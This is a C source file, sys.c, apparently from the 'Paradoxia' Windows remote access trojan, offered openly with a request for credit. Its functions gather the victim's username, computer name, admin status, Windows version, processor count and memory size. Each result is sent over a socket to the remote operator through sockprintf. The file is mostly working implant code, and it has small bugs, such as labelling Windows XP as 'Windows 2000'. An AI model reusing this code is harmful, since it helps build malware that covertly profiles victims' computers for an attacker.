
/*
Author: Fahad (QuantumCore)
sys.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/

#include "paradoxia.h"
// This may be useful somewhere
BOOL isFile(const char* file)
{
	DWORD dwAttrib = GetFileAttributes(file);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// TODO : Add Error handlng
void UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	sockprintf( "%s / %s", username, hostname);

}




char* cDir()
{
	static char DIR[MAX_PATH];
	memset(DIR, '\0', MAX_PATH);
	GetCurrentDirectory(MAX_PATH, DIR);
	return (char*)DIR;
}

BOOL IsAdmin() {
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		dwError = GetLastError();

	}
	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
		&fIsRunAsAdmin)) {
		dwError = GetLastError();

	}

	if (pAdministratorsGroup) {
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	return fIsRunAsAdmin;
}


char* ParadoxiaInfo()
{
	static char DIR[MAX_PATH];
    GetModuleFileName(NULL, DIR, MAX_PATH);
	return PathFindFileName(DIR);
}

void OS()
{
	int ret = 0.0;
	NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;
	RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (NULL != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof osInfo;
		RtlGetVersion(&osInfo);
		ret = osInfo.dwMajorVersion;
	}
	int mw = osInfo.dwMinorVersion;
	if (ret == 5) {
		switch (mw)
		{
		case 0:
			// 5.0 = Windows 2000
			sockprintf( "Windows 2000");
			break;
		case 1:
			// 5.1 = Windows XP
			sockprintf( "Windows 2000");
			break;

		case 2:
			sockprintf( "Windows XP Professional");
			break;

		default:
			sockprintf( "Windows %i", mw);
			break;
		}
	}
	else if (ret == 6) {
		switch (mw)
		{
		case 0:
			sockprintf( "Windows Vista");
			break;
		case 1:
			sockprintf( "Windows 7");
			break;
		case 2:
			sockprintf( "Windows 8");
			break;
		case 3:
			sockprintf( "Windows 8.1");
			break;

		default:
			sockprintf( "Windows %i", mw);
			break;
		}
	}
	else if (ret == 10) {
		sockprintf( "Windows 10");
	}
	else {

		sockprintf( "Windows %i", mw);
	}
}


void SYSTEMINFO(int mode) {
	SYSTEM_INFO info;
	GetSystemInfo(&info);
	switch (mode)
	{
	case 0:
		sockprintf( "%i", info.dwNumberOfProcessors);
		break;

	case 1:
		sockprintf( "%i", info.dwPageSize);
		break;

	case 2:
		sockprintf( "%i", info.lpMinimumApplicationAddress);
		break;

	case 3:
		sockprintf( "%i", info.lpMaximumApplicationAddress);
		break;

	default:
		break;
	}
}


void ramsize(int mode)
{
	MEMORYSTATUSEX memstatx;
	memstatx.dwLength = sizeof(memstatx);
	GlobalMemoryStatusEx(&memstatx);
	float ramsize = memstatx.ullTotalPhys / (1024 * 1024);
	float memVrsize = memstatx.ullTotalVirtual / (1024 * 1024);
	
	if (mode == 1) {
		sockprintf( "%f", ramsize);
	}
	else {
		sockprintf( "%f", memVrsize);
	}
}